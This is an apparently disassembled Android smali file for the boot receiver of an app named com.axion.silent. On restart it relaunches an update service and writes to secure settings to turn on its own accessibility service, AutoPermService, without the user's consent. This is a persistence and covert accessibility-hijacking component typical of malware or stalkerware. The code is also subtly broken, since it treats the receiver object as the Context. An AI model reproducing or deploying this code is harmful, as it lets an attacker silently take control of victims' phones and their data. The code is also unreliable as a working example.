.class public Lcom/axion/silent/BootReceiver;
.super Landroid/content/BroadcastReceiver;

# Fires on BOOT_COMPLETED and on com.axion.silent.RESTART_SERVICE broadcast.
# Restarts the accessibility service (AutoPermService) and UpdateService
# so the app self-heals after device restart or service kill.

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 6
    if-eqz p0, :done
    if-eqz p1, :done

    # Start UpdateService (foreground-exempt on API <26, JobIntentService on 26+)
    :try_update
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/axion/silent/UpdateService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_update_end
    .catch Ljava/lang/Exception; {:try_update .. :try_update_end} :after_update
    :after_update

    # Re-enable and restart AccessibilityService via Settings.Secure if possible
    :try_a11y
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "enabled_accessibility_services"
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v2
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "/com.axion.silent.AutoPermService"
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Secure;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z
    # Also set accessibility_enabled = 1
    const-string v1, "accessibility_enabled"
    const-string v2, "1"
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Secure;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z
    :try_a11y_end
    .catch Ljava/lang/Exception; {:try_a11y .. :try_a11y_end} :done

    :done
    return-void
.end method
